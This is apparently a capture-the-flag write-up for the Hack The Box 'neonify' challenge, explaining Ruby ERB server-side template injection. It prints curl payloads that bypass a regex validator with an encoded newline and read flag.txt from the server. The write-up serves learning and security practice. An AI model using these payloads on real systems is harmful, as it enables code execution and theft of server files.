---
title: "Hackthebox neonify writeup"
date: 2022-06-21T00:56:12+05:30
draft: false
---

## Challenge Description :
> Name : neonify

> Difficulty : Easy

> Points : 20



> # “ It’s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!“



**What’s This?**

The website takes input from the user and styles it in neon

![](https://cdn-images-1.medium.com/max/3724/1*B_e7cLnf78vSNoj3fjSikQ.png)

Looking at the code Shows it runs ruby in the backend and checks for the user input using regex is between a-z and 0–9.

![](https://cdn-images-1.medium.com/max/2000/1*NwncYfl_aO3xI0QE2K_W5Q.png)

A quick Google search showed ERB is a templating system for ruby.



**What is that? **

-A user can run Ruby code in the plaintext document. As shown in the image

[https://docs.ruby-lang.org/en/2.3.0/ERB.html](https://docs.ruby-lang.org/en/2.3.0/ERB.html)

![](https://cdn-images-1.medium.com/max/3648/1*WKDvzXOF9ppnMvp56gIeHw.png)

**Vulnerability: Server-side Template Injection (SSTI)**

What is that?

As the name suggests an attacker can run a user native template syntax to inject the malicious payload on the server-side. This happens when the user-provided input is directly concatenated into the template.

Ex: If we provide ```<%= 7 * 7 %>``` as the user input and the server runs this as a template and returns the provided user input it will Produce 7*7=49  Output.

When we tried to inject this we get the error

![](https://cdn-images-1.medium.com/max/2460/1*dybzTXRFiqL3DeeggFsDDQ.png)

It’s because the regex is validating the user input is between 0–9 or a-z

We can search the google Ruby regex Bypass

[https://brakemanscanner.org/docs/warning_types/format_validation/](https://brakemanscanner.org/docs/warning_types/format_validation/)

![](https://cdn-images-1.medium.com/max/3054/1*Uuwnu_5Fo2m4z9unR9R_MQ.png)

An attacker can bypass this regex validator using the \n character

**Approach :**

The user input is sent to the server using POST Request using the in the form means application/x-www-form-encoded so we can build a payload in the URL Encode.

Anything after ```\n``` is skipped in the regex.

```%0A = \n```

Payload :

    curl -X POST -H "Content-Type:application/x-www-form-urlencoded"  -d "neon=lol%0iamhere" [http://159.65.81.40:30169/](http://159.65.81.40:30169/)

![](https://cdn-images-1.medium.com/max/2320/1*PQuIVHFY7TU969Ho_-MJXA.png)

Test if actually vulnerable :

    curl -X POST -H "Content-Type:application/x-www-form-urlencoded"  -d "neon=lol%0A<%= 7*7 %>" [http://159.65.81.40:30169/](http://159.65.81.40:30169/)

![](https://cdn-images-1.medium.com/max/2000/1*TyFfzRALeFSa9rHJlIro8w.png)

Yes, it is !!

![](https://cdn-images-1.medium.com/max/2000/1*FShlRl5mkFtlf-ZPvutWGg.gif)



As the flag lies in the same directory as in the code let's grab a Flag.

![](https://cdn-images-1.medium.com/max/2000/1*L1yNYsTdS2K7GKUm82fRsQ.png)



***Final Payload :***

    curl -X POST -H "Content-Type:application/x-www-form-urlencoded"  -d "neon=lol%0A%3C%25%3D+File.open%28%27flag.txt%27%29.read+%25%3E" [http://159.65.81.40:30169/](http://159.65.81.40:30169/)


![](https://cdn-images-1.medium.com/max/2138/1*zcFuWFkzLdkqB6GZxqYBaw.png)
> # **Pwned!**
![](https://cdn-images-1.medium.com/max/2000/1*U7mCeT-gaQxdsThE9jXHSQ.png)